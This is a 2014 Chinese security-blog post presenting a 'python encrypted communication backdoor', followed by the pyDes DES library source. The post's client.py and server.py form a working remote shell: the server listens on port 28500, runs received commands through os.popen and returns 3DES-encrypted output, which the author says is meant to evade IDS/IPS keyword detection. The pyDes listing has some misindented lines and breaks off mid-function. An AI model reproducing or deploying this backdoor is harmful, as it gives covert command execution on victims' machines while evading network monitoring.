<!DOCTYPE html>
<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>python加密通讯后门 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="冷冷的夜" /><meta name="description" content="python加密通讯后门。加密通讯内容过一些检测数据包匹配关键字的ips和ids还是可以的，简单的demo。" />
<meta name="keywords" content="python加密通讯后门" />



<meta name="baidu-site-verification" content="GSIJv096Bu" />



<meta name="generator" content="Hugo 0.82.0" />


<link rel="canonical" href="https://lcx.cc/post/4322/" />





<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="python加密通讯后门" />
<meta property="og:description" content="python加密通讯后门。加密通讯内容过一些检测数据包匹配关键字的ips和ids还是可以的，简单的demo。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lcx.cc/post/4322/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2014-05-13T10:10:11&#43;08:00" />
<meta property="article:modified_time" content="2014-05-13T10:10:11&#43;08:00" />

<meta itemprop="name" content="python加密通讯后门">
<meta itemprop="description" content="python加密通讯后门。加密通讯内容过一些检测数据包匹配关键字的ips和ids还是可以的，简单的demo。"><meta itemprop="datePublished" content="2014-05-13T10:10:11&#43;08:00" />
<meta itemprop="dateModified" content="2014-05-13T10:10:11&#43;08:00" />
<meta itemprop="wordCount" content="4807">
<meta itemprop="keywords" content="Python,后门,加密,app,Ascii,EXP,Html,HTTP,IE,IP,Net,POS,Rat,sock," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="python加密通讯后门"/>
<meta name="twitter:description" content="python加密通讯后门。加密通讯内容过一些检测数据包匹配关键字的ips和ids还是可以的，简单的demo。"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">Nuclear'Atk</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
          
        
      </li>
    

    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      Nuclear'Atk
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
          

        

      </li>
    

    
    

    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">python加密通讯后门</h1>
      
      <div class="post-meta">
        <time datetime="2014-05-13" class="post-time">
          2014-05-13
        </time>
        <div class="post-category">
            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
            <a href="https://lcx.cc/categories/python/"> Python </a>
            <a href="https://lcx.cc/categories/%E5%90%8E%E9%97%A8/"> 后门 </a>
            <a href="https://lcx.cc/categories/%E5%8A%A0%E5%AF%86/"> 加密 </a>
            
          </div>
        <span class="more-meta"> 约 4807 字 </span>
          <span class="more-meta"> 预计阅读 10 分钟 </span>

        
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content">
    
  </div>
</div>

    
    <div class="post-content">
      
<p style="text-indent:2em;">
	加密通讯内容过一些检测数据包匹配关键字的ips和ids还是可以的，简单的demo。
</p>
<p style="text-indent:2em;">
	client.py
</p>
<pre class="prettyprint lang-py"># client
import socket
import time
import binascii
import base64
import pyDes
import sys
#use des
iv = '2132435465768797'
key = 'aa000000000000000000000002200000000000aa0000000d'
#data = "afuckfucdfadf"
#des

def encrypt(iv, key, data):
    iv = binascii.unhexlify(iv)
    key = binascii.unhexlify(key)
    k = pyDes.triple_des(key, pyDes.CBC, iv, pad=None, padmode=pyDes.PAD_PKCS5)
    d = k.encrypt(data)
    d = base64.encodestring(d)
    return d

def decrypt(iv, key, data):
    iv = binascii.unhexlify(iv)
    key = binascii.unhexlify(key)
    k = pyDes.triple_des(key, pyDes.CBC, iv, pad=None, padmode=pyDes.PAD_PKCS5)
    data = base64.decodestring(data)
    d = k.decrypt(data)
    return d
if __name__ == '__main__':
  print sys.argv[1]+sys.argv[2]
  print 'client.py ip port'
  address = (sys.argv[1], int(sys.argv[2]))
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(address)
  data =decrypt(iv,key,s.recv(512))
  print data
  while True:
    commond=raw_input()
    s.send(encrypt(iv,key,commond))
    time.sleep(1)
    if(commond=='q'):
      exit()

    data = decrypt(iv,key,s.recv(9999))
    print data.rstrip('\n')

  s.close()</pre>
<p style="text-indent:2em;">
	server.py
</p>
<pre class="prettyprint lang-py"># server
import socket
import subprocess
import os
import time
import binascii
import base64
import pyDes


##use des
iv = '2132435465768797'
key = 'aa000000000000000000000002200000000000aa0000000d'
#data = "aaaaaaaaaaaaaaaaaa"
##use des
def encrypt(iv, key, data):
    iv = binascii.unhexlify(iv)
    key = binascii.unhexlify(key)
    k = pyDes.triple_des(key, pyDes.CBC, iv, pad=None, padmode=pyDes.PAD_PKCS5)
    d = k.encrypt(data)
    d = base64.encodestring(d)
    return d

def decrypt(iv, key, data):
    iv = binascii.unhexlify(iv)
    key = binascii.unhexlify(key)
    k = pyDes.triple_des(key, pyDes.CBC, iv, pad=None, padmode=pyDes.PAD_PKCS5)
    data = base64.decodestring(data)
    d = k.decrypt(data)
    return d
banner="by  \r\n"
address = ('0.0.0.0', 28500)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # s = socket.socket()
s.bind(address)
s.listen(5)
ss, addr = s.accept()
def cmd(data,pwds):
    if "q" == data.lower():
        s.close()
        #break;
        exit(1)
    else:
        if data.startswith('cd'):
            print '2 pwd is'+pwds
            str=pwds+data[3:].replace('\n','')
            print 'str is '+str

            os.chdir(str)
            pwds=os.getcwd()
            result=['',pwds]
        else:
            r=os.popen(data).read()
            result=[r,pwds]
    return result



def main():
    pwds=os.getcwd()
    ss.send(encrypt(iv,key,banner+'\r\npath is '+pwds))
    while  True:
        ra =decrypt(iv,key,ss.recv(512))
        [r,pwds]=cmd(ra,pwds)
        ss.send(encrypt(iv,key,r+pwds))



    ss.close()
    s.close()

if   __name__  ==  "__main__":

       main()</pre>
<p style="text-indent:2em;">
	用的是这个库http://twhiteman.netfirms.com/des.html
</p>
<p style="text-indent:2em;">
	pyDes.py
</p>
<pre class="prettyprint lang-py">#############################################################################
#         Documentation            #
#############################################################################

# Author:   Todd Whiteman
# Date:     16th March, 2009
# Verion:   2.0.0
# License:  Public Domain - free to do as you wish
# Homepage: http://twhiteman.netfirms.com/des.html
#
# This is a pure python implementation of the DES encryption algorithm.
# It's pure python to avoid portability issues, since most DES
# implementations are programmed in C (for performance reasons).
#
# Triple DES class is also implemented, utilising the DES base. Triple DES
# is either DES-EDE3 with a 24 byte key, or DES-EDE2 with a 16 byte key.
#
# See the README.txt that should come with this python module for the
# implementation methods used.
#
# Thanks to:
#  * David Broadwell for ideas, comments and suggestions.
#  * Mario Wolff for pointing out and debugging some triple des CBC errors.
#  * Santiago Palladino for providing the PKCS5 padding technique.
#  * Shaya for correcting the PAD_PKCS5 triple des CBC errors.
#
"""A pure python implementation of the DES and TRIPLE DES encryption algorithms.

Class initialization
--------------------
pyDes.des(key, [mode], [IV], [pad], [padmode])
pyDes.triple_des(key, [mode], [IV], [pad], [padmode])

key     -&gt; Bytes containing the encryption key. 8 bytes for DES, 16 or 24 bytes
     for Triple DES
mode    -&gt; Optional argument for encryption type, can be either
     pyDes.ECB (Electronic Code Book) or pyDes.CBC (Cypher Block Chaining)
IV      -&gt; Optional Initial Value bytes, must be supplied if using CBC mode.
     Length must be 8 bytes.
pad     -&gt; Optional argument, set the pad character (PAD_NORMAL) to use during
     all encrypt/decrpt operations done with this instance.
padmode -&gt; Optional argument, set the padding mode (PAD_NORMAL or PAD_PKCS5)
     to use during all encrypt/decrpt operations done with this instance.

I recommend to use PAD_PKCS5 padding, as then you never need to worry about any
padding issues, as the padding can be removed unambiguously upon decrypting
data that was encrypted using PAD_PKCS5 padmode.

Common methods
--------------
encrypt(data, [pad], [padmode])
decrypt(data, [pad], [padmode])

data    -&gt; Bytes to be encrypted/decrypted
pad     -&gt; Optional argument. Only when using padmode of PAD_NORMAL. For
     encryption, adds this characters to the end of the data block when
     data is not a multiple of 8 bytes. For decryption, will remove the
     trailing characters that match this pad character from the last 8
     bytes of the unencrypted data block.
padmode -&gt; Optional argument, set the padding mode, must be one of PAD_NORMAL
     or PAD_PKCS5). Defaults to PAD_NORMAL.


Example
-------
from pyDes import *

data = "Please encrypt my data"
k = des("DESCRYPT", CBC, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
# For Python3, you'll need to use bytes, i.e.:
#   data = b"Please encrypt my data"
#   k = des(b"DESCRYPT", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
d = k.encrypt(data)
print "Encrypted: %r" % d
print "Decrypted: %r" % k.decrypt(d)
assert k.decrypt(d, padmode=PAD_PKCS5) == data


See the module source (pyDes.py) for more examples of use.
You can also run the pyDes.py file without and arguments to see a simple test.

Note: This code was not written for high-end systems needing a fast
      implementation, but rather a handy portable solution with small usage.

"""

import sys

# _pythonMajorVersion is used to handle Python2 and Python3 differences.
_pythonMajorVersion = sys.version_info[0]

# Modes of crypting / cyphering
ECB =  0
CBC =  1

# Modes of padding
PAD_NORMAL = 1
PAD_PKCS5 = 2

# PAD_PKCS5: is a method that will unambiguously remove all padding
#            characters after decryption, when originally encrypted with
#            this padding mode.
# For a good description of the PKCS5 padding technique, see:
# http://www.faqs.org/rfcs/rfc1423.html

# The base class shared by des and triple des.
class _baseDes(object):
  def __init__(self, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):
    if IV:
      IV = self._guardAgainstUnicode(IV)
    if pad:
      pad = self._guardAgainstUnicode(pad)
    self.block_size = 8
    # Sanity checking of arguments.
    if pad and padmode == PAD_PKCS5:
      raise ValueError("Cannot use a pad character with PAD_PKCS5")
    if IV and len(IV) != self.block_size:
      raise ValueError("Invalid Initial Value (IV), must be a multiple of " + str(self.block_size) + " bytes")

    # Set the passed in variables
    self._mode = mode
    self._iv = IV
    self._padding = pad
    self._padmode = padmode

  def getKey(self):
    """getKey() -&gt; bytes"""
    return self.__key

  def setKey(self, key):
    """Will set the crypting key for this object."""
    key = self._guardAgainstUnicode(key)
    self.__key = key

  def getMode(self):
    """getMode() -&gt; pyDes.ECB or pyDes.CBC"""
    return self._mode

  def setMode(self, mode):
    """Sets the type of crypting mode, pyDes.ECB or pyDes.CBC"""
    self._mode = mode

  def getPadding(self):
    """getPadding() -&gt; bytes of length 1. Padding character."""
    return self._padding

  def setPadding(self, pad):
    """setPadding() -&gt; bytes of length 1. Padding character."""
    if pad is not None:
      pad = self._guardAgainstUnicode(pad)
    self._padding = pad

  def getPadMode(self):
    """getPadMode() -&gt; pyDes.PAD_NORMAL or pyDes.PAD_PKCS5"""
    return self._padmode

  def setPadMode(self, mode):
    """Sets the type of padding mode, pyDes.PAD_NORMAL or pyDes.PAD_PKCS5"""
    self._padmode = mode

  def getIV(self):
    """getIV() -&gt; bytes"""
    return self._iv

  def setIV(self, IV):
    """Will set the Initial Value, used in conjunction with CBC mode"""
    if not IV or len(IV) != self.block_size:
      raise ValueError("Invalid Initial Value (IV), must be a multiple of " + str(self.block_size) + " bytes")
     IV = self._guardAgainstUnicode(IV)
    self._iv = IV

  def _padData(self, data, pad, padmode):
    # Pad data depending on the mode
    if padmode is None:
      # Get the default padding mode.
      padmode = self.getPadMode()
    if pad and padmode == PAD_PKCS5:
      raise ValueError("Cannot use a pad character with PAD_PKCS5")

    if padmode == PAD_NORMAL:
      if len(data) % self.block_size == 0:
        # No padding required.
        return data

      if not pad:
        # Get the default padding.
        pad = self.getPadding()
      if not pad:
        raise ValueError("Data must be a multiple of " + str(self.block_size) + " bytes in length. Use padmode=PAD_PKCS5 or set the pad character.")
       data += (self.block_size - (len(data) % self.block_size)) * pad

    elif padmode == PAD_PKCS5:
      pad_len = 8 - (len(data) % self.block_size)
      if _pythonMajorVersion &lt; 3:
        data += pad_len * chr(pad_len)
      else:
        data += bytes([pad_len] * pad_len)

    return data

  def _unpadData(self, data, pad, padmode):
    # Unpad data depending on the mode.
    if not data:
      return data
    if pad and padmode == PAD_PKCS5:
      raise ValueError("Cannot use a pad character with PAD_PKCS5")
    if padmode is None:
      # Get the default padding mode.
      padmode = self.getPadMode()

    if padmode == PAD_NORMAL:
      if not pad:
        # Get the default padding.
        pad = self.getPadding()
      if pad:
        data = data[:-self.block_size] + \
               data[-self.block_size:].rstrip(pad)

    elif padmode == PAD_PKCS5:
      if _pythonMajorVersion &lt; 3:
        pad_len = ord(data[-1])
      else:
        pad_len = data[-1]
      data = data[:-pad_len]

    return data

  def _guardAgainstUnicode(self, data):
    # Only accept byte strings or ascii unicode values, otherwise
    # there is no way to correctly decode the data into bytes.
    if _pythonMajorVersion &lt; 3:
      if isinstance(data, unicode):
        raise ValueError("pyDes can only work with bytes, not Unicode strings.")
     else:
      if isinstance(data, str):
        # Only accept ascii unicode values.
        try:
          return data.encode('ascii')
        except UnicodeEncodeError:
          pass
        raise ValueError("pyDes can only work with encoded strings, not Unicode.")
     return data

#############################################################################
#             DES              #
#############################################################################
class des(_baseDes):
  """DES encryption/decrytpion class

  Supports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.

  pyDes.des(key,[mode], [IV])

  key  -&gt; Bytes containing the encryption key, must be exactly 8 bytes
  mode -&gt; Optional argument for encryption type, can be either pyDes.ECB
    (Electronic Code Book), pyDes.CBC (Cypher Block Chaining)
  IV   -&gt; Optional Initial Value bytes, must be supplied if using CBC mode.
    Must be 8 bytes in length.
  pad  -&gt; Optional argument, set the pad character (PAD_NORMAL) to use
    during all encrypt/decrpt operations done with this instance.
  padmode -&gt; Optional argument, set the padding mode (PAD_NORMAL or
    PAD_PKCS5) to use during all encrypt/decrpt operations done
    with this instance.
  """


  # Permutation and translation tables for DES
  __pc1 = [56, 48, 40, 32, 24, 16,  8,
      0, 57, 49, 41, 33, 25, 17,
      9,  1, 58, 50, 42, 34, 26,
     18, 10,  2, 59, 51, 43, 35,
     62, 54, 46, 38, 30, 22, 14,
      6, 61, 53, 45, 37, 29, 21,
     13,  5, 60, 52, 44, 36, 28,
     20, 12,  4, 27, 19, 11,  3
  ]

  # number left rotations of pc1
  __left_rotations = [
    1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
  ]

  # permuted choice key (table 2)
  __pc2 = [
    13, 16, 10, 23,  0,  4,
     2, 27, 14,  5, 20,  9,
    22, 18, 11,  3, 25,  7,
    15,  6, 26, 19, 12,  1,
    40, 51, 30, 36, 46, 54,
    29, 39, 50, 44, 32, 47,
    43, 48, 38, 55, 33, 52,
    45, 41, 49, 35, 28, 31
  ]

  # initial permutation IP
  __ip = [57, 49, 41, 33, 25, 17, 9,  1,
    59, 51, 43, 35, 27, 19, 11, 3,
    61, 53, 45, 37, 29, 21, 13, 5,
    63, 55, 47, 39, 31, 23, 15, 7,
    56, 48, 40, 32, 24, 16, 8,  0,
    58, 50, 42, 34, 26, 18, 10, 2,
    60, 52, 44, 36, 28, 20, 12, 4,
    62, 54, 46, 38, 30, 22, 14, 6
  ]

  # Expansion table for turning 32 bit blocks into 48 bits
  __expansion_table = [
    31,  0,  1,  2,  3,  4,
     3,  4,  5,  6,  7,  8,
     7,  8,  9, 10, 11, 12,
    11, 12, 13, 14, 15, 16,
    15, 16, 17, 18, 19, 20,
    19, 20, 21, 22, 23, 24,
    23, 24, 25, 26, 27, 28,
    27, 28, 29, 30, 31,  0
  ]

  # The (in)famous S-boxes
  __sbox = [
    # S1
    [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
     0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
     4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
     15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],

    # S2
    [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
     3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
     0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
     13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],

    # S3
    [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
     13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
     13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
     1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],

    # S4
    [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
     13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
     10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
     3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],

    # S5
    [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
     14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
     4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
     11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],

    # S6
    [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
     10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
     9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
     4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],

    # S7
    [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
     13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
     1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
     6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],

    # S8
    [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
     1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
     7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
     2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],
  ]


  # 32-bit permutation function P used on the output of the S-boxes
  __p = [
    15, 6, 19, 20, 28, 11,
    27, 16, 0, 14, 22, 25,
    4, 17, 30, 9, 1, 7,
    23,13, 31, 26, 2, 8,
    18, 12, 29, 5, 21, 10,
    3, 24
  ]

  # final permutation IP^-1
  __fp = [
    39,  7, 47, 15, 55, 23, 63, 31,
    38,  6, 46, 14, 54, 22, 62, 30,
    37,  5, 45, 13, 53, 21, 61, 29,
    36,  4, 44, 12, 52, 20, 60, 28,
    35,  3, 43, 11, 51, 19, 59, 27,
    34,  2, 42, 10, 50, 18, 58, 26,
    33,  1, 41,  9, 49, 17, 57, 25,
    32,  0, 40,  8, 48, 16, 56, 24
  ]

  # Type of crypting being done
  ENCRYPT =  0x00
  DECRYPT =  0x01

  # Initialisation
  def __init__(self, key, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):
    # Sanity checking of arguments.
    if len(key) != 8:
      raise ValueError("Invalid DES key size. Key must be exactly 8 bytes long.")
     _baseDes.__init__(self, mode, IV, pad, padmode)
    self.key_size = 8

    self.L = []
    self.R = []
    self.Kn = [ [0] * 48 ] * 16  # 16 48-bit keys (K1 - K16)
    self.final = []

    self.setKey(key)

  def setKey(self, key):
    """Will set the crypting key for this object. Must be 8 bytes."""
    _baseDes.setKey(self, key)
    self.__create_sub_keys()

  def __String_to_BitList(self, data):
    """Turn the string data, into a list of bits (1, 0)'s"""
    if _pythonMajorVersion &lt; 3:
      # Turn the strings into integers. Python 3 uses a bytes
      # class, which already has this behaviour.
      data = [ord(c) for c in data]
    l = len(data) * 8
    result = [0] * l
    pos = 0
    for ch in data:
      i = 7
      while i &gt;= 0:
        if ch &amp; (1 &lt;&lt; i) != 0:
          result[pos] = 1
        else:
          result[pos] = 0
        pos += 1
        i -= 1

    return result

  def __BitList_to_String(self, data):
    """Turn the list of bits -&gt; data, into a string"""
    result = []
    pos = 0
    c = 0
    while pos &lt; len(data):
      c += data[pos] &lt;&lt; (7 - (pos % 8))
      if (pos % 8) == 7:
        result.append(c)
        c = 0
      pos += 1

    if _pythonMajorVersion &lt; 3:
      return ''.join([ chr(c) for c in result ])
    else:
      return bytes(result)

  def __permutate(self, table, block):
    """Permutate this block with the specified table"""
    return list(map(lambda x: block[x], table))

  # Transform the secret key, so that it is ready for data processing
  # Create the 16 subkeys, K[1] - K[16]
  def __create_sub_keys(self):
    """Create the 16 subkeys K[1] to K[16] from the given key"""
    key = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))
    i = 0
    # Split into Left and Right sections
    self.L = key[:28]
    self.R = key[28:]
    while i &lt; 16:
      j = 0
      # Perform circular left shifts
      while j &lt; des.__left_rotations[i]:
        self.L.append(self.L[0])
        del self.L[0]

        self.R.append(self.R[0])
        del self.R[0]

        j += 1

      # Create one of the 16 subkeys through pc2 permutation
      self.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)

      i += 1

  # Main part of the encryption algorithm, the number cruncher :)
  def __des_crypt(self, block, crypt_type):
    """Crypt the block of data through DES bit-manipulation"""
    block = self.__permutate(des.__ip, block)
    self.L = block[:32]
    self.R = block[32:]

    # Encryption starts from Kn[1] through to Kn[16]
    if crypt_type == des.ENCRYPT:
      iteration = 0
      iteration_adjustment = 1
    # Decryption starts from Kn[16] down to Kn[1]
    else:
      iteration = 15
      iteration_adjustment = -1

    i = 0
    while i &lt; 16:
      # Make a copy of R[i-1], this will later become L[i]
      tempR = self.R[:]

      # Permutate R[i - 1] to start creating R[i]
      self.R = self.__permutate(des.__expansion_table, self.R)

      # Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here
      self.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))
      B = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]
       # Optimization: Replaced below commented code with above
      #j = 0
      #B = []
      #while j &lt; len(self.R):
      #  self.R[j] = self.R[j] ^ self.Kn[iteration][j]
      #  j += 1
      #  if j % 6 == 0:
      #    B.append(self.R[j-6:j])

      # Permutate B[1] to B[8] using the S-Boxes
      j = 0
      Bn = [0] * 32
      pos = 0
      while j &lt; 8:
        # Work out the offsets
        m = (B[j][0] &lt;&lt; 1) + B[j][5]
        n = (B[j][1] &lt;&lt; 3) + (B[j][2] &lt;&lt; 2) + (B[j][3] &lt;&lt; 1) + B[j][4]

        # Find the permutation value
        v = des.__sbox[j][(m &lt;&lt; 4) + n]

        # Turn value into bits, add it to result: Bn
        Bn[pos] = (v &amp; 8) &gt;&gt; 3
        Bn[pos + 1] = (v &amp; 4) &gt;&gt; 2
        Bn[pos + 2] = (v &amp; 2) &gt;&gt; 1
        Bn[pos + 3] = v &amp; 1

        pos += 4
        j += 1

      # Permutate the concatination of B[1] to B[8] (Bn)
      self.R = self.__permutate(des.__p, Bn)

      # Xor with L[i - 1]
      self.R = list(map(lambda x, y: x ^ y, self.R, self.L))
      # Optimization: This now replaces the below commented code
      #j = 0
      #while j &lt; len(self.R):
      #  self.R[j] = self.R[j] ^ self.L[j]
      #  j += 1

      # L[i] becomes R[i - 1]
      self.L = tempR

      i += 1
      iteration += iteration_adjustment

    # Final permutation of R[16]L[16]
    self.final = self.__permutate(des.__fp, self.R + self.L)
    return self.final


  # Data to be encrypted/decrypted
  def crypt(self, data, crypt_type):
    """Crypt the data in blocks, running it through des_crypt()"""

    # Error check the data
    if not data:
      return ''
    if len(data) % self.block_size != 0:
      if crypt_type == des.DECRYPT: # Decryption must work on 8 byte blocks
        raise ValueError("Invalid data length, data must be a multiple of " + str(self.block_size) + " bytes\n.")
       if not self.getPadding():
        raise ValueError("Invalid data length, data must be a multiple of " + str(self.block_size) + " bytes\n. Try setting the optional padding character")
       else:
        data += (self.block_size - (len(data) % self.block_size)) * self.getPadding()
       # print "Len of data: %f" % (len(data) / self.block_size)

    if self.getMode() == CBC:
      if self.getIV():
        iv = self.__String_to_BitList(self.getIV())
      else:
        raise ValueError("For CBC mode, you must supply the Initial Value (IV) for ciphering")

    # Split the data into blocks, crypting each one seperately
    i = 0
    dict = {}
    result = []
    #cached = 0
    #lines = 0
    while i &lt; len(data):
      # Test code for caching encryption results
      #lines += 1
      #if dict.has_key(data[i:i+8]):
        #print "Cached result for: %s" % data[i:i+8]
      #  cached += 1
      #  result.append(dict[data[i:i+8]])
      #  i += 8
      #  continue

      block = self.__String_to_BitList(data[i:i+8])

      # Xor with IV if using CBC mode
      if self.getMode() == CBC:
